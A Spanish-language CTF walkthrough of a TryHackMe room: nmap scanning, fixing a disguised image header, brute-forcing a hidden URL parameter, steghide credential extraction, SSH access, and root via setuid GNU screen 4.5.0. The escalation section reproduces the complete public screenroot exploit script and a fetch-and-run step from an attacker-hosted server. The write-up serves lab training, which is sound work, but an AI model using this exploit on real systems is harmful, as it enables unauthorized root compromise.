Bienvenidos a otra sala de TryHackMe !. En esta sala, usaremos nuestra herramienta bien conocida para escanear puertos abiertos, descubriremos como editar y solucionar problemas de error en una imagen con formatos distintos. Utilizaremos steghide para extraer informacion de imagenes y establecer una conexion ssh al sistema para luego escalar privilegios abusandonos de un programa con version desactualizada.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-01 23:52:17 EDT for 23s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo nmap nos muestra 2 puertos abiertos bien conocidos. Navegaremos dentro del servidor web y nos encontramos que pertenece al servicio apache. Podemos iniciar un reconocimiento a directorios ocultos, pero si abrimos el page source de la pagina vemos un mensaje oculto por nuestro querido amigo. Se trata de una imagen **thm.jpg** que al querer abrirla dentro de nuestro navegador nos va a dar un error. Si observamos el nombre de la ventana (PNG IMAGE) ya podemos darnos una idea de lo que esta pasando. El archivo esta con extension .png pero parece que pertenece a la extension .jpg. Para corregir esto nos transferimos la imagen a nuestra maquina atacante para editar los valores y pasarlo a extension .jpg con `hexeditor`

En nuestra maquina atacante : `wget http://IPTARGET/thm.jpg`
Una vez transferido el archivo, abrimos la imagen con hexeditor y podemos notar que pertenece al grupo .jpg pero con valores de .png
Pasamos a modificar con `hexeditor`:

```bash
hexeditor thm.jpg

VALOR PNG --> '89 50 4E 47 0D 0A 1A 0A 00 00 00 01'
VALOR JPG --> 'FF D8 FF E0 00 10 4A 46 49 46 00 01'
```

Ahora al abrir la imagen, encontraremos un directorio secreto.

# Intrusion

Navegamos al directorio que descubrimos anteriormente y nos encontraremos con un mensaje de algun secreto que tenemos que consultarle a la pagina. Miramos el page source y vemos que el secreto va del 0 al 99. Lo que tenemos que hacer en este caso, es agregarle la palabra `?secret=0` al final de la URL. Para no hacer esto de modo manual, crearemos un script en python para que nos facilite la tarea.

```python
import requests

url_base = "http://IPTARGET/th1s_1s_h1dd3n/?secret={}"

# Iterar del 0 al 99
for i in range(100):
	url = url_base.format(str(i)) # Formatear la URL con el valor de la cadena de secreto actual
	response = requests.get(url) # Hacer la solicitud HTTP GET
	# Aqui podes procesar la respuesta de la solicitud.. extraer analizar, segun el sitio web.
	print("URL:", url)
	print("Respuesta:", response.text)
	print("-----")
```

Una vez modificada la IP y ejecutando el script, empezara a hacer consultas al servidor web probando diferentes secretos, al encontrar el secreto nos notificara y nos mostrara el mensaje. Una vez encontrado el numero, podemos ver un mensaje que nos deja esta persona con algun tipo de mensaje secreto. 

Al pasarlo por cyberchef, probando diferentes metodos para descubrir que es lo que quiso decir, pero no tuve exito. Volvi a la sala de Tryhackme y mire en la descripcion que debia utilizar `steghide`. Como obtuvimos una imagen anteriormente, probe poniendo este mensaje secreto, que resulto ser la password para extraer el contenido de la imagen **thm.jph** que habiamos descubierto antes.

```bash
steghide info thm.jpg # Nos muestra informacion  si existe algun archivo oculto
steghide extract -sf thm.jpg # Extraemos dicho archivo
```

Bien, obtuvimos un archivo .txt. Ya tenemos un user . Intente hacer ssh con la password anteriormente usada, pero no tuve exito.. Tenemos que buscar otra manera de encontrar la password que pertenece a la conexion ssh.

Repasando todo otra vez, fijandome si me olvidaba de algo, no le econtraba solucion.
El sercreto estaba dentro de la sala, que sin darme cuenta y pasarla por alto, hay una imagen que tenemos que usarla para encontrar la password que necesitamos para establecer la conexion.
Nos transferimos la imagen :`wget https://i.imgur.com/5iW7kC8.jpeg`

No necesitara password para extrar el archivo.

```bash
steghide extract -sf 5iW7kC8.jpeg
```

Bueno, ya tenemos nuestra credenciales, pero el usuario parece que no encaja. Tiene algun tipo de codificacion, asique volvi a cyberchef y lo decodifique usando `Vigenere decode` con la palabra clave **n**. Asi, ya tenemos nuestras credenciales para establecer nuestra conexion ssh.

```bash
ssh joker@IPTARGET
```

# Priv. Escalation

Listamos permisos elevados dentro del sistema ejecutando :

```bash
find / -type f -perm -4000 -ls 2>/dev/null

 -rwsr-xr-x root root        Mar  4  2019 /usr/lib/openssh/ssh-keysign
 -rwsr-xr-- root messagebus  Nov 29  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-
 -rwsr-xr-x root root        Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
 -rwsr-xr-x root root        May  8  2018 /usr/bin/vmware-user-suid-wrapper
 -rwsr-xr-x root root        Mar 26  2019 /usr/bin/gpasswd
 -rwsr-xr-x root root        Mar 26  2019 /usr/bin/passwd
 -rwsr-xr-x root root        Mar 26  2019 /usr/bin/newgrp
 -rwsr-xr-x root root        Mar 26  2019 /usr/bin/chsh
 -rwsr-xr-x root root        Mar 26  2019 /usr/bin/chfn
 -rwsr-xr-x root root        Oct 11  2019 /usr/bin/sudo
 -rwsr-xr-x root root        Jul 12  2016 /bin/fusermount
 -rwsr-xr-x root root        Mar 26  2019 /bin/su
 -rwsr-xr-x root root        May  7  2014 /bin/ping6
 -rwsr-xr-x root root        Jan  4  2020 '/bin/screen-4.5.0'
 -rwsr-xr-x root root        Jan  4  2020 '/bin/screen-4.5.0.old'
 -rwsr-xr-x root root        Oct 10  2019 /bin/mount
 -rwsr-xr-x root root        May  7  2014 /bin/ping
 -rwsr-xr-x root root        Oct 10  2019 /bin/umount

```

Bueno, ya tenemos un programa con su version. Nosotros como atacantes nos interesa saber esto, asique realizamos una busqueda acerca de este programa y como podemos abusarnos de esto para escalar privilegios.

Al hacer una busqueda, primero verificamos si el programa funcione corroborando la version del sistema, esto lo hacemos ejecutando `screen --version`.
Buscamos el exploit para `screen 4.5.0`. Utilice este exploit que ya viene armado y podemos usar para obtener una shell con  permisos root. https://www.exploit-db.com/exploits/41154

```c
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

Una vez lo tengamos en nuestra maquina atacante, abrimos un servidor python3 http para transferirnos el archivo a la maquina victima del sistema. Le daremos permisos de ejecucion y lo ejecutamos. Una vez terminado el proceso, tendremos nuestra shell interactiva de usuario raiz root.

```bash
python3 -m http.server 8080 # Dentro del directorio donde tengamos el exploit

cd /dev/shm # Maquina victima del sistema
wget http://LHOST:8080/exploit.c
chmod +x exploit.c
./exploit.c

```


